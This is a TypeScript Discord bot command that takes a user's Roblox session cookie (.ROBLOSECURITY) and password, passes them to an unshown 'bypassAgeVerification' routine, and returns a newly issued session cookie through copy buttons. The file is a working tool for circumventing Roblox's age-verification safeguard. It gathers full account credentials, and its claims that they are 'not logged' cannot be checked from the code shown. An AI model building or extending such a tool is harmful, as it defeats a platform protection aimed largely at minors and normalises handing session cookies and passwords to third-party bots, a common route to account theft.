import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
} from 'discord.js';
import * as Roblox from '../../lib/roblox-api';
import { buildSuccessEmbed, buildErrorEmbed, buildInvalidCookieEmbed, buildIpLimitEmbed, buildProgressEmbed, buildBypassNoMailEmbed } from '../../lib/embed-helpers';
import { buildCopyButtons } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const bypassStore = new Map<string, string>();

const data = new SlashCommandBuilder()
  .setName('bypass')
  .setDescription('Bypass Stuff')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addStringOption(opt =>
    opt.setName('cookie')
      .setDescription('The .ROBLOSECURITY cookie')
      .setRequired(true)
  )
  .addStringOption(opt =>
    opt.setName('password')
      .setDescription('Your Roblox password (we do NOT log or store this)')
      .setRequired(true)
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const rawCookie = interaction.options.getString('cookie', true);
    const password = interaction.options.getString('password', true);

    const validation = await Roblox.validateCookie(rawCookie);
    if (!validation.valid) {
      const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const emailInfo = await Roblox.fetchEmailInfo(rawCookie);
    if (!emailInfo.verified) {
      const embed = buildBypassNoMailEmbed(validation.username!);
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const progressEmbed = buildProgressEmbed('Sending bypass request...');
    await interaction.editReply({ embeds: [progressEmbed] });

    const bypassResult = await Roblox.bypassAgeVerification(rawCookie, password);
    if (bypassResult.success) {
      const newCookie = bypassResult.newCookie;
      const id = newCookie ? Math.random().toString(36).slice(2, 10) : '';
      if (newCookie) {
        bypassStore.set(id, newCookie);
        setTimeout(() => bypassStore.delete(id), 300000);
      }
      const embed = buildSuccessEmbed(
        '✧ **Bypass Result**\n' +
        `────\n` +
        `⭑ **Status:** Success\n` +
        `⭑ **Message:** ${bypassResult.message}\n` +
        (newCookie ? `⭑ **New Cookie Issued:** Yes\n` : `⭑ **New Cookie Issued:** No\n`) +
        `⭑ Your credentials were not logged.`
      );
      const row = newCookie ? buildCopyButtons(id, 'bypass') : undefined;
      await interaction.editReply({ embeds: [embed], components: row ? [row] : [] });
    } else {
      if (bypassResult.message === 'Progressing..') {
        const embed = buildProgressEmbed('Bypass in progress... Please wait and check later.');
        await interaction.editReply({ embeds: [embed] });
      } else {
        await interaction.editReply({ embeds: [buildErrorEmbed(`✧ **Bypass Failed**\n────\n⭑ ${bypassResult.message}\n⭑ Your credentials were not logged.`)] });
      }
    }
  } catch (err: any) {
    logger.error({ err }, 'Bypass command error');
    await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')] });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  try {
    const customId = interaction.customId;
    if (!customId.startsWith('bypass_')) return;
    const parts = customId.split('_');
    const action = parts[1];
    const id = parts[2];
    const cookie = bypassStore.get(id);
    if (!cookie) {
      await interaction.reply({ content: '𖣐 This button has expired.', flags: MessageFlags.Ephemeral });
      return;
    }
    if (action === 'copypc') {
      await interaction.reply({ content: `\`\`\`\n${cookie}\n\`\`\``, flags: MessageFlags.Ephemeral });
    } else if (action === 'copymob') {
      await interaction.reply({ content: `\`${cookie}\``, flags: MessageFlags.Ephemeral });
    }
  } catch (err: any) {
    logger.error({ err }, 'Bypass button error');
    await interaction.reply({ content: '𖣐 Error', flags: MessageFlags.Ephemeral });
  }
}

export const bypassCommand: Command = { data, execute, handleButton };